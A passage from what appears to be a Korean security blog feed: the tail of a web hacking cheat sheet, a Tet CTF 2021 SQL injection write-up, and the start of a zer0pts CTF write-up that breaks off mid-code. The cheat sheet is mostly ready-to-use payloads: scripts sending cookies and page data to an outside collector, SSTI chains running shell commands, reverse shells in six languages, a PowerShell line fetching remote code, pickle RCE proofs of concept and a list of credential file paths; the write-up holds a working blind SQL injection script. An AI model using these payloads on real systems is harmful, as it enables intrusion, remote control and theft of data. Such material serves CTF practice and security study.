class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Javascript-Payload"><a href="#Javascript-Payload" class="headerlink" title=" Javascript Payload"></a><span style="color:#21C587"></span> Javascript Payload<br></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">x</span>=&gt;</span>x.text()).then(<span class="function"><span class="params">x</span>=&gt;</span>fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+x));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x.text();&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">xx</span>)</span>&#123;fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+xx)&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">x.send();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20&lt;FILE&gt;`</span>).toString()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 아래 코드는 파일의 이름이 &#x27;T&#x27;로 시작하는 파일을 모두 읽는 코드이다. 만약 읽으려는 파일의 이름이 &#x27;F&#x27;로 시작한다면 &#x27;F\x2a&#x27;를 주면된다.</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><hr><h2 id="SSTI"><a href="#SSTI" class="headerlink" title=" SSTI"></a><span style="color:#21C587"></span> SSTI<br></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.mro()[<span class="number">1</span>].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.mro()[<span class="number">1</span>].__subclasses__()[<span class="number">396</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request[request.args.param]&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*<span class="number">2</span>,request.args.<span class="keyword">class</span>,request.args.usc*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;__&quot;</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;__&quot;</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(request.args.f|<span class="built_in">format</span>(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">287</span>)(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>)|attr(<span class="string">&#x27;communicate&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">0</span>)|attr(<span class="string">&#x27;decode&#x27;</span>)(<span class="string">&#x27;utf-8&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title=" Path Traversal"></a><span style="color:#21C587"></span> Path Traversal<br></h2><p><span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;exe</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><h2 id="IPv4-to-IP-Decimal-Conversion"><a href="#IPv4-to-IP-Decimal-Conversion" class="headerlink" title=" IPv4 to IP Decimal Conversion"></a><span style="color:#21C587"></span> IPv4 to IP Decimal Conversion<br></h2><p><a href="https://www.ipaddressguide.com/ip">Link</a></p><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/~/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/~</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a><br><br><em>Reference</em> : <a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/~</a><br><br><em>Reference</em> : <a href="https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss">https://portswigger.net/research/~</a><br><br><em>Reference</em> : <a href="https://www.ipaddressguide.com/ip">vhttps://www.ipaddressguide.com/ip</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021년 1월 1일 오전 9시부터 Tet CTF라는 대회가 열렸습니다. 그래서 이번 대회에서 출제된 SQL Injectino 문제의 풀이를 작성해보겠습니다. 사실 대회는 2일동안 진행했는데 1시간도 안 했음,, 게임 한다고,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 <code>flag</code>를 뽑아야겠다 생각이 들었습니다.</strong><br><br></p><p><strong>하지만 <code>culumn</code>이라는 키워드가 필터링이 걸려 있어 <code>flag</code>가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 <code>information_schema.columns</code>라는 메타 테이블에서 <code>column_name</code>을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>그러다가 N1 CTF에서 <code>exp()</code> 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 <code>exp()</code>함수를 이용해서 <code>Overflow</code>를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 <code>exp()</code> 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 <code>exp()</code> 함수 대신 <code>pow()</code> 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, <code>t_fl4g_v3lue_su</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-zer0pts-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h2 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h2><blockquote><p>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</p></blockquote><p><span style="color:#631F9C">&#62;</span> SSTI Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span 